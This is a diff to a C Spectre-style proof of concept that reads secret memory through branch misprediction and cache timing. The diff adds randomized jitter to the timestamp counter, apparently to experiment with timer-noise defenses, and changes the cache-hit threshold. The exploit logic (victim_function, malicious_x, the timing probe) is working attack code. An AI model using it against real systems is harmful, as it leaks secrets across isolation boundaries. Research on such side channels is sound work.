@@ -11,6 +11,25 @@
 #endif
 
 unsigned int eax, ebx, ecx, edx;
+
+unsigned int rand_interval(unsigned int min, unsigned int max)
+{
+    int r;
+    const unsigned int range = 1 + max - min;
+    const unsigned int buckets = RAND_MAX / range;
+    const unsigned int limit = buckets * range;
+
+    /* Create equal size buckets all in a row, then fire randomly towards
+     * the buckets until you land in one of them. All buckets are equally
+     * likely. If you land off the end of the line of buckets, try again. */
+    do
+    {
+        r = rand();
+    } while (r >= limit);
+
+    return min + (r / buckets);
+}
+
 /********************************************************************
 Victim code.
 ********************************************************************/
@@ -49,10 +68,24 @@ void victim_function(size_t x) {
   }
 }
 
+static uint64_t itsc = 0LL;
+static inline uint64_t my_tsc(unsigned int delta)
+{
+    register uint64_t r = __rdtsc( );
+    register uint64_t r1 = r+delta;
+    return r1;
+    if (itsc ==0) { itsc = r; return r; } //init
+
+    if (itsc < r1) { itsc = r1; return itsc; } // far away
+
+    itsc += delta/2;
+    return itsc;
+}
+
 /********************************************************************
 Analysis code
 ********************************************************************/
-#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+#define CACHE_HIT_THRESHOLD (0xff) /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
@@ -94,12 +127,16 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
       addr = & array2[mix_i * 512];
 //      time1 = __rdtscp( & junk); /* READ TIMER */
 //      __get_cpuid(2, &eax, &ebx, &ecx, &edx);
-      //asm volatile ("mfence" ::: "memory");
-      time1 = __rdtsc( ); /* READ TIMER */
+
+      unsigned int delta1 = rand_interval(0, 0x7ff);
+      unsigned int delta2 = rand_interval(0, 0x7ff);
+
+      asm volatile ("mfence" ::: "memory");
+      time1 = my_tsc(delta1); //__rdtsc( ); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
 //      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
       asm volatile ("mfence" ::: "memory");
-      time2 = __rdtsc( ) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+      time2 = my_tsc(delta2) - time1; //__rdtsc( ) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 //      time2 =30 ;
       if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
@@ -148,6 +185,7 @@ struct timespec *TimeSpecDiff(struct timespec *ts1, struct timespec *ts2)
 static inline uint64_t RDTSC()
 {
   unsigned int hi, lo;
+  asm volatile ("mfence" ::: "memory");
   __asm__ volatile("rdtsc" : "=a" (lo), "=d" (hi));
   return ((uint64_t)hi << 32) | lo;
 }
@@ -180,11 +218,12 @@ void InitRdtsc()
 int main(int argc,
   const char * * argv) {
 
-
+  printf("%x\n", RAND_MAX);
+/*
   struct timespec ts1, ts2;
   clock_gettime(CLOCK_MONOTONIC, &ts1);
   clock_gettime(CLOCK_MONOTONIC, &ts2);
-  InitRdtsc();
+  InitRdtsc();*/
 
   size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
   int i, score[2], len = 100;
